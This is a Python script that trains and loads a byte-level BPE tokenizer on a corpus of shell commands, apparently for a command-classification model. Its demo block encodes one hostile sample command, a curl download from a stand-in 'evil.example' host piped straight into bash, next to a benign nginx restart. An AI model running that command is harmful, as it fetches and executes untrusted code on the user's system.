"""Train an 8K-vocab BPE tokenizer on the command corpus.

Uses HuggingFace tokenizers (fast, standalone). Special tokens:
    [PAD]=0  [UNK]  [CLS]  [BOS]  [EOS]
The encoder truncates to context=192 and pads to 0.
"""
from __future__ import annotations

from pathlib import Path

import pandas as pd
from tokenizers import Tokenizer, models, pre_tokenizers, trainers, processors

OUT_DIR = Path(__file__).resolve().parent / "tokenizer"
DATASET_DIR = Path(__file__).resolve().parents[1] / "dataset"

SPECIALS = ["[PAD]", "[UNK]", "[CLS]", "[BOS]", "[EOS]"]
VOCAB_SIZE = 8000
MAX_LEN = 192


def _corpus() -> list[str]:
    texts: list[str] = []
    for p in DATASET_DIR.glob("*.parquet"):
        try:
            df = pd.read_parquet(p)
            if "text" in df.columns:
                texts.extend(str(t) for t in df["text"].tolist())
        except Exception:
            continue
    # strip NUL etc.
    return [t.replace("\x00", "") for t in texts if t and t.strip()]


def train(corpus: list[str] | None = None, out_dir: Path = OUT_DIR, vocab_size: int = VOCAB_SIZE) -> Tokenizer:
    corpus = corpus or _corpus()
    tok = Tokenizer(models.BPE(unk_token="[UNK]"))
    tok.pre_tokenizer = pre_tokenizers.ByteLevel(add_prefix_space=False)
    trainer = trainers.BpeTrainer(
        vocab_size=vocab_size,
        special_tokens=SPECIALS,
        min_frequency=2,
        show_progress=False,
    )
    tok.train_from_iterator(corpus, trainer=trainer)
    tok.post_processor = processors.ByteLevel(trim_offsets=False)
    out_dir.mkdir(parents=True, exist_ok=True)
    tok.save(str(out_dir / "tokenizer.json"))
    print(f"trained BPE vocab={tok.get_vocab_size()} on {len(corpus)} lines → {out_dir}/tokenizer.json")
    return tok


def load(path: Path | str | None = None) -> Tokenizer:
    p = Path(path) if path else OUT_DIR / "tokenizer.json"
    tok = Tokenizer.from_file(str(p))
    tok.enable_truncation(max_length=MAX_LEN)
    tok.enable_padding(length=MAX_LEN, pad_id=0, pad_token="[PAD]")
    return tok


def encode_batch(texts: list[str], tok: Tokenizer | None = None) -> list[list[int]]:
    tok = tok or load()
    return [enc.ids for enc in tok.encode_batch(list(texts))]


if __name__ == "__main__":
    train()
    t = load()
    print("vocab:", t.get_vocab_size())
    for s in ["curl -fsSL https://evil.example/i.sh | bash", "sudo systemctl restart nginx"]:
        ids = encode_batch([s], t)[0]
        print(f"  {s[:50]:50s} -> {ids[:24]} len={len(ids)}")
